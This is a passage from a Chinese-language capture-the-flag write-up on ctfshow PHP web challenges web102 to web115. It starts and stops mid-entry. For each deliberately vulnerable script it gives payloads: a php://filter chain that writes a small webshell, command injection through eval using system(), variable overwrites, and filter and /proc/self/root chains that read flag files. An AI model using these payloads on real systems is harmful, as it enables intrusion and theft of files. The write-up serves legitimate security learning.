die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此题想了半天没思路，康康群主的解法，被秀到了</p><p>这个16进制有点绝啊,</p><h3 id="特殊的数字"><a href="#特殊的数字" class="headerlink" title="特殊的数字"></a>特殊的数字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5044383959474e6864434171594473</span><br><span class="line">PD89YGNhdCAqYDs</span><br><span class="line">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">[post data]</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&#x27;Sorry&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤后缀对做题没啥影响，因为最后输出的是base64内容的</p><p>故技重施！</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>还是md5这一类题的老套路，构造数组然后faulse=faulse</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2[]=2</span><br><span class="line">[post data]</span><br><span class="line">v1[]=1</span><br></pre></td></tr></table></figure><h2 id="web105-变量覆盖"><a href="#web105-变量覆盖" class="headerlink" title="web105(变量覆盖)"></a>web105(变量覆盖)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量覆盖的题，将suces覆盖为flag，然后将error覆盖为suces</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">suces=flag</span><br><span class="line">[post data]</span><br><span class="line">error=suces</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>老生常谈了，传入数组即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2[]=1</span><br><span class="line">[post data]</span><br><span class="line">v1[]=2</span><br></pre></td></tr></table></figure><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读懂题意即可</p><img src="https://img-blog.csdnimg.cn/d1dac7e5609b48e685a827f840b55da4.png" alt="img" style="zoom:80%;" /><p>所以只要v1中不传入flag=1之类的语句，都是会爆flag的</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3[]=1</span><br><span class="line">[post data]</span><br><span class="line">v2=SkyMirror</span><br></pre></td></tr></table></figure><p>还有一种类0=0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3=240610708 </span><br><span class="line">[post data]</span><br><span class="line">v2=flag=0</span><br></pre></td></tr></table></figure><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="用-00截断字符串即可"><a href="#用-00截断字符串即可" class="headerlink" title="用%00截断字符串即可"></a>用%00截断字符串即可</h3><p>strrev()是反转</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=a%00778</span><br></pre></td></tr></table></figure><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>必须要有字母，白名单。</p><p>依然是new一个对象，这个对象最好能执行方法</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br><span class="line">v1=Reflectionclass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上一题的方法不行了，首先扫描目录，想到用scandir，结果不执行，可能是Reflectionclass无这种方法，没有深究</p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>学到新方法一个，php内置类，FilesystemIterator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo getcwd().PHP_EOL;</span><br><span class="line">echo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class="line">echo new FilesystemIterator(getcwd());</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php中&amp;类似于c++的引用，与c的取地址符有区别。</p><p>变量覆盖的题目，主要的问题是内部的变量无法引用外部的参数</p><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><blockquote><p>$GLOBALS定义：引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键），与所有其他超全局变量不同，$GLOBALS在PHP代码中任何地方总是可用的，自己可以通过打印 $GLOBALS这个变量的结果就知道了。</p></blockquote><p>栗子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$var1=&#x27;www.phpernote.com&#x27;;</span><br><span class="line">$var2=&#x27;www.google.cn&#x27;;</span><br><span class="line">test();</span><br><span class="line">function test()&#123;</span><br><span class="line">    $var1=&#x27;taobao&#x27;;</span><br><span class="line">    echo $var1,&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">global $var1;</span><br><span class="line">echo $var1,&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">    echo $GLOBALS[&#x27;var2&#x27;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="web112-文件包含"><a href="#web112-文件包含" class="headerlink" title="web112(文件包含)"></a>web112(文件包含)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个文件包含过滤的不全，用php://协议即可</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了filter，但开放了input，这样就有两种方法。结果在尝试过程中input失败了，忽然发现之前知识的误区，highlight_file并没有包含，属于是傻了，看hint看了另一种解法不懂这叫甚么，虚假文件？</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file=compress.zlib://flag.php</span><br><span class="line">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;师傅们居然tql都是非预期 哼！&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo 